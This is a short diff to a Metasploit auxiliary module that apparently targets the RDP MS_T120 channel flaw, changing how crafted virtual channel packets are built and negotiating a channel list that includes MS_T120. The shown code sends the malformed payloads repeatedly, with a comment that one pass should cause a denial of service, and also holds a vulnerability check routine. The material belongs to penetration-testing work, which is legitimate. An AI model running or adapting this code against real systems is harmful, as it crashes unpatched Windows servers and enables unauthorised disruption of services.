@@ -155,10 +155,9 @@ class MetasploitModule < Msf::Auxiliary
     x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
 
     6.times do
-      # 0xed03 = Channel 1005
-      x86_packet = rdp_build_pkt(x86_payload, "\x03\xed")
+      x86_packet = rdp_build_pkt(x86_payload, 'MS_T120')
       rdp_send(x86_packet)
-      x64_packet = rdp_build_pkt(x64_payload, "\x03\xed")
+      x64_packet = rdp_build_pkt(x64_payload, 'MS_T120')
       rdp_send(x64_packet)
 
       # A single pass should be sufficient to cause DoS
@@ -216,7 +215,15 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Safe
     end
 
-    success = rdp_negotiate_security(nsock, server_selected_proto)
+    channels = [
+        { :flags => 0x0000a0c0, :name => 'cliprdr' },
+        { :flags => 0x00008080, :name => 'MS_T120' },
+        { :flags => 0x000000c0, :name => 'rdpsnd'  },
+        { :flags => 0x000000c0, :name => 'snddbg'  },
+        { :flags => 0x00008080, :name => 'rdpdr'   },
+      ]
+
+    success = rdp_negotiate_security(nsock, server_selected_proto, channels)
     return Exploit::CheckCode::Unknown unless success
 
     rdp_establish_session
